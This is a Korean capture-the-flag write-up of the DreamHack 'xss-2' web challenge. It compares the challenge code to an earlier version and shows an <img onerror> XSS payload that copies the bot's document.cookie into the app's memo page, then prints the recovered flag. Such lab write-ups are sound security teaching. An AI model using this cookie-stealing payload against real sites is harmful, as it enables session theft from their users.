# [DreamHack] xss-2

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> 여러 기능과 입력받은 URL을 확인하는 봇이 구현된 서비스입니다.
> XSS 취약점을 이용해 플래그를 획득하세요. 플래그는 flag.txt, FLAG 변수에 있습니다.
>
> Release: [xss-2.zip](https://github.com/h0meb0dy/Dreamhack-Wargame/files/8551259/xss-2.zip)

## Analysis

xss-1 문제와 `app.py` 코드를 비교해보면 다음과 같다.

```
$ diff -c app.py ../xss-1/release/app
.py
*** app.py      2021-08-09 22:26:35.000000000 +0900
--- ../xss-1/release/app.py     2021-07-08 14:28:04.000000000 +0900
***************
*** 51,57 ****

  @app.route("/vuln")
  def vuln():
!     return render_template("vuln.html")


  @app.route("/flag", methods=["GET", "POST"])
--- 51,58 ----

  @app.route("/vuln")
  def vuln():
!     param = request.args.get("param", "")
!     return param


  @app.route("/flag", methods=["GET", "POST"])
```

원래는 `vuln()`에서 `render_template()`을 사용하지 않고 `param`을 그대로 return해서 스크립트 삽입이 가능했는데, 이번 문제에서는 `render_template()`을 사용하기 때문에 `<script>` 태그를 사용할 수 없다. 하지만 `<img>` 태그는 정상적으로 삽입이 가능하다. `/vuln?param=<img src="https://dreamhack.io/assets/img/logo.0a8aabe.svg">`로 접속해보면 다음과 같이 이미지가 뜨는 것을 확인할 수 있다.

![image](https://user-images.githubusercontent.com/102066383/162655808-1b67a494-8c16-4e59-b973-844f65befb46.png)

## Exploit

`<img>` 태그의 `onerror` 속성을 이용하면 이미지를 불러오는 데에 실패했을 경우 수행할 동작을 자바스크립트로 정의할 수 있다. 예를 들어 `/vuln?param=<img src="a" onerror="alert(1)">`로 접속해보면

![image](https://user-images.githubusercontent.com/102066383/162656918-52975743-df38-42a4-92f8-ba49054b1767.png)

`onerror`의 스크립트가 실행되는 것을 확인할 수 있다.

이 스크립트에 `document.location.href='/memo?memo='+document.cookie`를 넣으면 쿠키에 저장된 플래그가 `memo_text`에 들어가게 되고, `/memo`로 접속하면 플래그를 획득할 수 있다.

![image](https://user-images.githubusercontent.com/102066383/162657290-86701102-405e-457a-b4d6-2c8504ef02ab.png)

입력 칸에 `<img src="a" onerror="document.location.href='/memo?memo='+document.cookie">`를 넣고 제출하면

![image](https://user-images.githubusercontent.com/102066383/162657323-f20e46fd-7d55-4808-9052-a15b4f8d884a.png)

`/memo`에서 플래그를 확인할 수 있다.

```
flag: DH{3c01577e9542ec24d68ba0ffb846508f}
```
